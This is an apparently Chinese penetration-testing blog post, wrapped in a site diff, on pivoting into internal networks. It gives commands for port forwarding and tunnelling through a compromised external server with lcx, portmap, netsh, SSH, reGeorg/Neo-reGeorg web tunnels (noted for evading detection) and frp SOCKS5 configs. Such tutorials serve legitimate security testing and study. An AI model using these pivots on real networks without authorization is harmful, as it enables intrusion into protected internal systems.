@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='go!'><title>内网代理转发</title>
+
+<link rel='canonical' href='https://coollllllll.github.io/p/intranet-8/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='内网代理转发'>
+<meta property='og:description' content='go!'>
+<meta property='og:url' content='https://coollllllll.github.io/p/intranet-8/'>
+<meta property='og:site_name' content='cOOl &#39;s blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2021-11-02T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-11-02T00:00:00&#43;00:00'/><meta property='og:image' content='https://coollllllll.github.io/p/intranet-8/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+<meta name="twitter:title" content="内网代理转发">
+<meta name="twitter:description" content="go!"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://coollllllll.github.io/p/intranet-8/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>返回</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/intranet-8/">
+                <img src="/p/intranet-8/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg"
+                        srcset="/p/intranet-8/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg 800w, /p/intranet-8/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="534" 
+                        loading="lazy"
+                        alt="Featured image of post 内网代理转发" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%86%85%E7%BD%91/" style="background-color: #2a9d8f; color: #fff;">
+                内网
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/intranet-8/">内网代理转发</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        go!
+    </h3>
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Nov 02, 2021</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 3 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <h1 id="内网代理转发">内网代理转发</h1>
+<p><strong>假如有这样的环境：</strong></p>
+<p>外网服务器存在双网卡，内网服务器不可访问公网但可以直接和外网服务器进行通信。基于这个场景，攻击者以外网服务器作为跳板，对内网服务器进行继续渗透。</p>
+<h2 id="端口转发类">端口转发类</h2>
+<h3 id="lcx">Lcx</h3>
+<h4 id="本地端口转发">本地端口转发</h4>
+<p>防火墙等访问控制策略：不允许公网直接访问3389端口，此时可以尝试 lcx 的本地转发功能将其转发到其他端口。</p>
+<ul>
+<li>先上传 lcx.exe 至外网服务器，执行如下</li>
+</ul>
+<pre tabindex="0"><code>lcx.exe -tran 8888 127.0.0.1 3389
+
+# 将本地8888端口流量转发到本地3389端口
+# 攻击者直接连接外网服务器8888端口
+</code></pre><h4 id="正向端口转发">正向端口转发</h4>
+<p>拿下外网服务器权限和内网服务器账号密码，尝试直接访问内网的3389端口。</p>
+<ul>
+<li>外网服务器执行</li>
+</ul>
+<pre tabindex="0"><code>lcx.exe -tran 8888 192.168.77.2 3389
+
+# 将本地8888端口流量转发到内网机器3389端口
+# 攻击者直接连接外网服务器8888端口
+</code></pre><h4 id="反向端口转发">反向端口转发</h4>
+<p>拿下外网服务器和内网服务器的权限，并知道内网服务器账号密码。攻击者想要连接内网服务器的3389服务，但是防火墙规则，不允许外网服务器直接访问它。</p>
+<p>可尝试在内网机器上将内网端口主动转发到外网服务器，随后攻击者连接外网服务器即可。</p>
+<ul>
+<li>外网服务器监听在7777端口，并本地转发到8888端口</li>
+</ul>
+<pre tabindex="0"><code>lcx.exe -listen 7777 8888
+</code></pre><ul>
+<li>内网服务器主动反向连接外网服务器7777端口，并转发本地的3389端口流量</li>
+</ul>
+<pre tabindex="0"><code>lcx.exe -slave 192.168.77.1 7777 127.0.0.1 3389
+</code></pre><ul>
+<li>攻击者连接外网服务器8888端口即可</li>
+</ul>
+<h4 id="linux-下的lcx">Linux 下的Lcx</h4>
+<p>portmap就是Linux下的lcx，需要手动上传 c 文件，并进行编译使用。</p>
+<ul>
+<li>将流量正向转发到外网服务器的3389端口</li>
+</ul>
+<pre tabindex="0"><code>./portmap -m l -p1 8888 -h2 192.168.77.2 -p2 3389
+</code></pre><h3 id="netsh">Netsh</h3>
+<p>Netsh 是 Windows 自带的命令行脚本工具，它可以建立端口映射。与 Lcx 不同，netsh 不支持反向的端口转发。</p>
+<h4 id="本地端口转发-1">本地端口转发</h4>
+<pre tabindex="0"><code>netsh interface portproxy add v4tov4 listenport=8888 connectaddress=192.168.77.1 connectport=3389 
+</code></pre><pre tabindex="0"><code># 删除策略
+netsh interface portproxy delete v4tov4 listenport=8888
+</code></pre><h4 id="正向端口转发-1">正向端口转发</h4>
+<pre tabindex="0"><code>Netshinterface portproxy add v4tov4 listenaddress=192.168.77.1 8888 connectaddress=192.168.77.2 connectport=3389
+</code></pre><pre tabindex="0"><code># 删除策略
+Netsh interface portproxy delete v4tov4 listenport=8888 listenaddress=192.168.77.1
+</code></pre><h3 id="ssh">SSH</h3>
+<h4 id="本地端口转发-2">本地端口转发</h4>
+<p>在本地主机 Host A 上开启端口流量转发</p>
+<pre tabindex="0"><code># 本地执行
+ssh -L 8866:192.168.10.3:23 -fN username@192.168.10.2
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 182; 
+			flex-basis: 437px"
+	>
+	<a href="/p/intranet-8/image-20220306145433046.png" data-size="854x468">
+		<img src="/p/intranet-8/image-20220306145433046.png"
+			width="854"
+			height="468"
+			srcset="/p/intranet-8/image-20220306145433046_hufe88f06f287b10d00f796ed16925f317_227360_480x0_resize_box_3.png 480w, /p/intranet-8/image-20220306145433046_hufe88f06f287b10d00f796ed16925f317_227360_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h4 id="远程端口转发">远程端口转发</h4>
+<p>在远程主机 Host B 上开启端口流量转发</p>
+<pre tabindex="0"><code># 在HostB上执行
+ssh -R 8866:192.168.10.3:23 -fN username@192.168.10.1
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 178; 
+			flex-basis: 427px"
+	>
+	<a href="/p/intranet-8/image-20220306145547993.png" data-size="838x470">
+		<img src="/p/intranet-8/image-20220306145547993.png"
+			width="838"
+			height="470"
+			srcset="/p/intranet-8/image-20220306145547993_hudb1054e17c2931a87d88b5aab3fcd73d_207022_480x0_resize_box_3.png 480w, /p/intranet-8/image-20220306145547993_hudb1054e17c2931a87d88b5aab3fcd73d_207022_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h2 id="socks-代理类">SOCKS 代理类</h2>
+<h3 id="regeorg">reGeorg</h3>
+<p>reGeorg是一款把内网服务器端口的数据通过HTTP/HTTPS隧道转发到本机，实现基于HTTP通信的工具。</p>
+<ul>
+<li>上传 tunnerl 文件</li>
+<li>攻击机运行：</li>
+</ul>
+<pre tabindex="0"><code>python reGeorgSocksProxy.py -p 8080 -u http://ip:port/tunnel/tunnel.jsp
+</code></pre><ul>
+<li>使用其他渗透工具时配置 socks 代理为本地8080端口即可 或者 使用Proxifier配置全局代理(Windows)、proxychains(Linux)</li>
+</ul>
+<blockquote>
+<p>注意：Socks协议通过TCP协议进行数据传输，因而不提供如传递 ICMP 信息之类的网络层相关服务，ping测试会发现不通。</p>
+</blockquote>
+<h3 id="neo-regeorg">Neo-reGeorg</h3>
+<p>reGeorg稳定性不太好，且容易被杀，<strong>Neo-reGeorg</strong> 是一个旨在积极重构 <a class="link" href="https://github.com/sensepost/reGeorg"  target="_blank" rel="noopener"
+    >reGeorg</a> 的项目。</p>
+<ul>
+<li>提高 tunnel 连接安全性</li>
+<li>提高可用性，避免特征检测</li>
+<li>提高传输内容保密性</li>
+<li>应对更多的网络环境场景</li>
+</ul>
+<p><strong>基本使用：</strong></p>
+<ul>
+<li>设置密码生成 tunnel并上传到WEB服务器</li>
+</ul>
+<pre tabindex="0"><code>python neoreg.py generate -k password
+</code></pre><ul>
+<li>使用 neoreg.py 连接 WEB 服务器，在本地建立 socks5 代理</li>
+</ul>
+<pre tabindex="0"><code>python neoreg.py -k password -u http://xx/tunnel.php
+</code></pre><h3 id="frp">frp</h3>
+<p>frp 采用 Golang 编写，支持跨平台，仅需下载对应平台的二进制文件即可执行。</p>
+<ul>
+<li>服务端启动(在自己 VPS上 )</li>
+</ul>
+<pre tabindex="0"><code>./frps -c ./frps.ini
+</code></pre><pre tabindex="0"><code>[common]
+bind_port = 7000
+Bind_addr = 0.0.0.0
+dashboard_port = 7500 # 仪表盘端口
+dashboard_user = admin # 仪表盘账号与密码
+dashboard_pwd = passadmin
+</code></pre><ul>
+<li>客户端启动(在获取到权限的跳板服务器上)</li>
+</ul>
+<pre tabindex="0"><code>./frpc -c ./frpc.ini
+</code></pre><pre tabindex="0"><code>[common]
+server_addr = # VPS 地址
+server_port = 7000
+
+[plugin_socks]
+type = tcp
+remote_port = 46075
+plugin = socks5
+plugin_user = admin
+plugin_passwd = admin123
+use_encryption = true
+use_compression = true
+</code></pre>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/intranet-5/">
+        
+        
+            <div class="article-image">
+                <img src="/p/intranet-5/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Kerberosating 攻击"
+                        data-key="intranet-5" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Kerberosating 攻击</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/intranet-4/">
+        
+        
+            <div class="article-image">
+                <img src="/p/intranet-4/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post PTH 攻击"
+                        data-key="intranet-4" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PTH 攻击</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/intranet-3/">
+        
+        
+            <div class="article-image">
+                <img src="/p/intranet-3/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 组策略相关"
+                        data-key="intranet-3" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">组策略相关</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/intranet-7/">
+        
+        
+            <div class="article-image">
+                <img src="/p/intranet-7/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 黄金票据、白银票据"
+                        data-key="intranet-7" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">黄金票据、白银票据</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/intranet-6/">
+        
+        
+            <div class="article-image">
+                <img src="/p/intranet-6/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post ACL 相关"
+                        data-key="intranet-6" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">ACL 相关</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 cOOl &#39;s blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">目录</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#端口转发类">端口转发类</a>
+      <ol>
+        <li><a href="#lcx">Lcx</a>
+          <ol>
+            <li><a href="#本地端口转发">本地端口转发</a></li>
+            <li><a href="#正向端口转发">正向端口转发</a></li>
+            <li><a href="#反向端口转发">反向端口转发</a></li>
+            <li><a href="#linux-下的lcx">Linux 下的Lcx</a></li>
+          </ol>
+        </li>
+        <li><a href="#netsh">Netsh</a>
+          <ol>
+            <li><a href="#本地端口转发-1">本地端口转发</a></li>
+            <li><a href="#正向端口转发-1">正向端口转发</a></li>
+          </ol>
+        </li>
+        <li><a href="#ssh">SSH</a>
+          <ol>
+            <li><a href="#本地端口转发-2">本地端口转发</a></li>
+            <li><a href="#远程端口转发">远程端口转发</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#socks-代理类">SOCKS 代理类</a>
+      <ol>
+        <li><a href="#regeorg">reGeorg</a></li>
+        <li><a href="#neo-regeorg">Neo-reGeorg</a></li>
+        <li><a href="#frp">frp</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
